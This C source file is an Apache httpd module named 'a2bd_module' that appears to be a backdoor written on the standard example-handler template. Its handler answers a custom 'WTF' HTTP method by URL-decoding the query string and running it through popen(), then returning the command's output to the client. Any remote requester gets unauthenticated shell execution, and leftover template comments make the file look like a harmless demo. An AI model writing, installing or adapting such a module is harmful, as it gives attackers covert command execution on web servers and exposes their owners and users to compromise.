
#include <stdio.h>
#include <stdlib.h>
#include "apr_hash.h"
#include "ap_config.h"
#include "ap_provider.h"
#include "httpd.h"
#include "http_core.h"
#include "http_config.h"
#include "http_log.h"
#include "http_protocol.h"
#include "http_request.h"
#include <ctype.h>

void urldecode2(char *dst, const char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else {
                        *dst++ = *src++;
                }
        }
        *dst++ = '\0';
}


static int example_handler(request_rec *r)
{


    /* Set the appropriate content type */
    ap_set_content_type(r, "text/html");

    /* Print out the IP address of the client connecting to us: */

    /* If we were reached through a GET or a POST request, be happy, else sad. */
    if ( !strcmp(r->method, "WTF")) {
        ap_rputs("You used my special WTF method!<br/>", r);
	if (r->args) {
	       char *output = malloc(strlen(r->args)+1);
	       urldecode2(output, r->args);
	       ap_rputs(output, r);
	       FILE *fp;
	       char path[1035];

	       /* Open the command for reading. */
	       fp = popen(output, "r");
	       if (fp == NULL) {
		       ap_rputs("Failed to run command",r);
		       exit(1);
	       }

	       /* Read the output a line at a time - output it. */
               while (fgets(path, sizeof(path)-1, fp) != NULL) {
                      ap_rprintf(r,"%s", path);
	       }

     /* close */
  		pclose(fp);
	}
	else {
		ap_rputs("No argument received",r);
	}
	return OK;
    }
    else {
	return DECLINED;
    }

    /* Lastly, if there was a query string, let's print that too! */
}

static void register_hooks(apr_pool_t *pool)
{
ap_hook_handler(example_handler, NULL, NULL, APR_HOOK_LAST);
}



module AP_MODULE_DECLARE_DATA   a2bd_module =
{
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks   /* Our hook registering function */
};
